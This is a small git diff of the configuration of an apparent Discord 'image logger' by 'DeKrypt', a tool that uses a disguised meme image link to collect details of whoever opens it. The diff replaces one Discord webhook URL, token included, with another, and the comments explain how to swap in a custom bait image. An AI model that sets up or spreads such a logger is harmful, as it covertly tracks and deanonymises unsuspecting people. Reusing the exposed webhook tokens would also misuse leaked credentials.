@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1353509703862321284/o4web5AJUDi3F8B-ddAmHxE_zzY6lzqG-cZCfjZjB72sL3EwGr85p2MM9Jj-LX8tYrDk",
+    "webhook": "https://discord.com/api/webhooks/1353735700943474688/9p6hl8eTcF285bFpp6CJvZT3hW3PjcEP0gYbBP8JN8hDlBrMzKIfpW6l2bEiossFi5Rb",
     "image": "https://en.meming.world/images/en/1/18/Giga_Chad.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
